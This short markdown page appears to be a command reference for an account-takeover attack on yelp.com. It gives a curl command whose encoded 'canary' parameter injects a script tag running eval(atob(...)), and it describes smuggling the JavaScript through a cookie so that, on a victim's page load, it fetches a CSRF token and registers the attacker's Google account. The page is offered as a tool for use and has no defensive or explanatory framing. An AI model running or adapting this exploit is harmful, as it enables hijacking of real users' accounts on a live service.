# Deploy ATO Payload

## Command

```bash
curl "https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%%3D%27%29%29%2F%2F%3BMax-Age%3D99999999" -c cookies.txt -v
```

## Description

Deploys the encoded ATO JS payload via cookie smuggling to link attacker's Google account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--canary` | Encoded ATO JS | Yes |

## Examples

### Basic Usage

Replace with encoded payload from CyberChef.

## Expected Output

Cookie set; on victim load, fetches csrftok and POSTs to register.
